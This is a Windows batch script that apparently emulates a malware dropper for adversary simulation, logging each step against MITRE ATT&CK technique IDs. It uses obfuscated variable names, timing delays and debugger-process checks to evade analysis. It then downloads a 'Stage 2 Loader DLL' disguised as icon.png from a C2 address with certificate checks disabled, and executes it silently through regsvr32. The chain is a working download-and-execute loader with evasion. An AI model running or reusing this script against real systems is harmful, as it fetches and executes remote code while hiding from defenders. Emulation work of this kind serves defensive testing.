@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10433\51c07486
SET rwmtjq=563d4ade.txt
SET bzxofy=https://10.0.0.49/stage/2/icon.png?10433-7
SET qlhsnd=BALAM-S2BO
SET tcwrpv=10433
SET mjdkue=7

SET logfile=%APPDATA%\!mjdkue!\macula-simulations.log
if not exist "%APPDATA%\!mjdkue!" mkdir "%APPDATA%\!mjdkue!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: script_start>> "!logfile!" 2>nul

REM Initial execution delay (anti-sandbox) — 15 seconds before any logic
timeout /t 15 /nobreak >nul

REM Random delay: 10-29 seconds
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: initial_delay_complete>> "!logfile!" 2>nul

REM Anti-analysis: Debugger.IsAttached equivalent in batch context
REM Check for common debugger-related environment artifacts; if found, sleep but continue
echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: anti_analysis_start>> "!logfile!" 2>nul

REM Check for CDB/WinDbg/NTSD presence in running processes via tasklist
tasklist /FI "IMAGENAME eq cdb.exe" 2>nul | find /I "cdb.exe" >nul 2>&1
if not errorlevel 1 (
    echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: debugger_detected_sleep>> "!logfile!" 2>nul
    SET /A dbgsleep=%RANDOM% %% 3001 + 2000
    timeout /t 3 /nobreak >nul
)
tasklist /FI "IMAGENAME eq windbg.exe" 2>nul | find /I "windbg.exe" >nul 2>&1
if not errorlevel 1 (
    echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: debugger_detected_sleep>> "!logfile!" 2>nul
    timeout /t 3 /nobreak >nul
)
tasklist /FI "IMAGENAME eq ntsd.exe" 2>nul | find /I "ntsd.exe" >nul 2>&1
if not errorlevel 1 (
    echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: debugger_detected_sleep>> "!logfile!" 2>nul
    timeout /t 3 /nobreak >nul
)

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: anti_analysis_complete>> "!logfile!" 2>nul

REM Log T1497 — evasion techniques always continue, result always OK
echo [%date% %time%][TTP][!qlhsnd!][!tcwrpv!]: T1497|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM Inter-operation delay before heartbeat
ping -n 8 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch — downloads Stage 2 Loader DLL from C2 in a single operation
curl -k -s -o "!pvnxkl!\!rwmtjq!" "!bzxofy!"
SET hberr=!errorlevel!

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: heartbeat_complete>> "!logfile!" 2>nul

if !hberr! equ 0 (
    echo [%date% %time%][TTP][!qlhsnd!][!tcwrpv!]: T1071|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!qlhsnd!][!tcwrpv!]: T1071|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
)

REM Inter-operation delay after heartbeat
CHOICE /C Y /N /D Y /T 7 >nul

REM Inter-operation delay before directory change
timeout /t 5 /nobreak >nul

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: chdir_start>> "!logfile!" 2>nul

REM Change working directory to Loader location
cd /d "!pvnxkl!" >nul 2>&1
SET cderr=!errorlevel!

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: chdir_result=!cderr!>> "!logfile!" 2>nul

REM Inter-operation delay before LOLBIN invocation
ping -n 6 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: dll_load_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: process_start>> "!logfile!" 2>nul

REM LOLBIN invocation — execute downloaded Loader DLL via regsvr32 (T1218.010)
regsvr32.exe /s !rwmtjq!
SET lberr=!errorlevel!

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: command_execution_result=!lberr!>> "!logfile!" 2>nul

if !lberr! equ 0 (
    echo [%date% %time%][TTP][!qlhsnd!][!tcwrpv!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!qlhsnd!][!tcwrpv!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!qlhsnd!][!tcwrpv!]: script_exit>> "!logfile!" 2>nul

endlocal